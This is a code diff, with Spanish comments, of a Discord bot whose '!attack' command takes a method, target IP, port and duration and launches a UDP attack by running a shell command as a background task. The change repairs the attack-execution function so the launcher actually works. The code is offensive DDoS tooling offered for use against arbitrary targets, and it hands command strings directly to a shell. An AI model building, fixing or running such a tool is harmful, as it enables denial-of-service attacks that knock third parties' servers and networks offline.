@@ -20,6 +20,19 @@ async def on_ready():
     print(f'Bot conectado como {bot.user.name}')
     await bot.change_presence(activity=discord.Game(name="Atacando con UDP"))
 
+# Función para ejecutar el ataque
+async def ejecutar_ataque(comando):
+    try:
+        proceso = await asyncio.create_subprocess_shell(
+            comando,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        await proceso.wait()  # Espera a que termine el proceso (opcional)
+        print(f"El ataque con comando '{comando}' ha finalizado.") # Imprime en consola
+    except Exception as e:
+        print(f"Error al ejecutar el ataque: {e}")
+
 # Comando !attack
 @bot.command(name='attack', help='Ejecuta un ataque UDP.')
 async def attack(ctx, metodo: str, ip: str, port: int, tiempo: int):
@@ -41,23 +54,9 @@ async def attack(ctx, metodo: str, ip: str, port: int, tiempo: int):
 
     # Ejecuta el comando en un proceso separado (fire and forget)
     try:
-        asyncio.create_task(self.ejecutar_ataque(comando))  # No esperamos a que termine
+        asyncio.create_task(ejecutar_ataque(comando))  # Llama a la función normal
     except Exception as e:
         await ctx.send(f'Error al iniciar el ataque: {e}')
-
-    # No esperamos a que el proceso termine. El bot sigue funcionando.
-
-    async def ejecutar_ataque(self, comando):
-      try:
-          proceso = await asyncio.create_subprocess_shell(
-              comando,
-              stdout=subprocess.PIPE,
-              stderr=subprocess.PIPE
-          )
-          await proceso.wait()  # Espera a que termine el proceso (opcional)
-          print(f"El ataque con comando '{comando}' ha finalizado.") # Imprime en consola
-      except Exception as e:
-          print(f"Error al ejecutar el ataque: {e}")
 
 # Inicia el bot
 bot.run(TOKEN)
